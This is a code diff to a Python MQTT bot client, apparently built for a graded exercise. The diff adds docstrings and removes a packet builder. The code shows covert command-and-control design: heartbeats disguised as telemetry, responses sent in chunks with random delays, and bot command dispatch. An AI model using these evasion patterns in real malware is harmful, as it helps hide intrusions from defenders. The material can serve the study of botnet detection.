@@ -22,6 +22,8 @@ DEBUG_PRINT = False
 #          and then routes them to the correct destinations.
 
 def run_heartbeat(client):
+    """ Sends periodic heartbeat messages to pretend to send normal periodic telemetry data.
+    Has no use otherwise."""
     while True:
         # random delay (45-90s)
         time.sleep(random.uniform(45, 90))
@@ -72,12 +74,13 @@ def send_fragmented_response(client, raw_result):
         log(f" - Sent chunk {i+1}/{total} ({len(chunk_data)} bytes)")
 
         # random delay
-        # todo NOTE, for a realistic bot, this should be a lot longer - similar to the heartbeat probably,
+        # NOTE, for a realistic bot, this should be a lot longer - similar to the heartbeat probably,
         #  but for building and grading, nobody wants to wait longer
         time.sleep(random.uniform(3, 5))
 
 
 def on_message(client, userdata, msg):
+    """ Callback when a message is received """
     try:
         # try parse json
         packet = json.loads(msg.payload.decode())
@@ -102,22 +105,15 @@ def on_message(client, userdata, msg):
         pass
 
 def process_and_respond(client, action, argument):
+    """ Process command and send response in chunks """
     result = get_action_result(action, argument)
     log(f"[*] Dispatching response ({len(result)} bytes) in chunks...")
     send_fragmented_response(client, result)
 
 
 
-def create_bot_packet(encrypted_res_b64):
-    res_packet = {
-        "s_id": BOT_ID,
-        "type": "telemetry_data",
-        DATA_KEY: encrypted_res_b64
-    }
-    return res_packet
-
-
 def get_action_result(action, argument):
+    """ Process the command and return the result string """
     try:
         if action == CMD_ANNOUNCE_BOT:
             result = f"Bot {BOT_ID} is online."
